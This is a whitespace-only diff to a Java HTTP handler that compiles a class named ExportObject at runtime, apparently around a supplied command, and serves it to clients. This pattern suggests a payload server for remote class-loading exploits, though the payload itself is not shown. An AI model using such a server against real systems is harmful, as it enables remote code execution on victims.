@@ -21,7 +21,7 @@ public class HttpFileHandler implements HttpHandler {
 
 	private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");
 	private String command;
-	
+
 	public HttpFileHandler(String command) {
 		this.command = command;
 	}
@@ -48,18 +48,18 @@ public class HttpFileHandler implements HttpHandler {
 			}
 
 			// compile at runtime
-	        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
-	        if (null == compiler) {
+			JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
+			if (null == compiler) {
 				System.out.println("[-] JavaCompiler is null - use JDK instead of JRE");
 				System.exit(2);
-	        }
-	        if (0 != compiler.run(null, null, null, temp.getAbsolutePath())) {
+			}
+			if (0 != compiler.run(null, null, null, temp.getAbsolutePath())) {
 				System.out.println("[-] JavaCompiler failed");
 				System.exit(3);
-	        }
-	        File res = temp.toPath().getParent().resolve("ExportObject.class").toFile();
+			}
+			File res = temp.toPath().getParent().resolve("ExportObject.class").toFile();
 			System.out.println("[+] compiling file " + res.getName());
-			
+
 			// return the compiled class
 			try (InputStream is = new FileInputStream(res) ) {
 
@@ -75,11 +75,11 @@ public class HttpFileHandler implements HttpHandler {
 				httpExchange.getResponseBody().write(bytes);
 				httpExchange.close();
 			}
-			
+
 			// remove temp files
 			temp.delete();
 			res.delete();
-	        
+
 		} catch (IOException e) {
 			System.out.println("[-] Exception: " + e.getMessage());
 			e.printStackTrace();
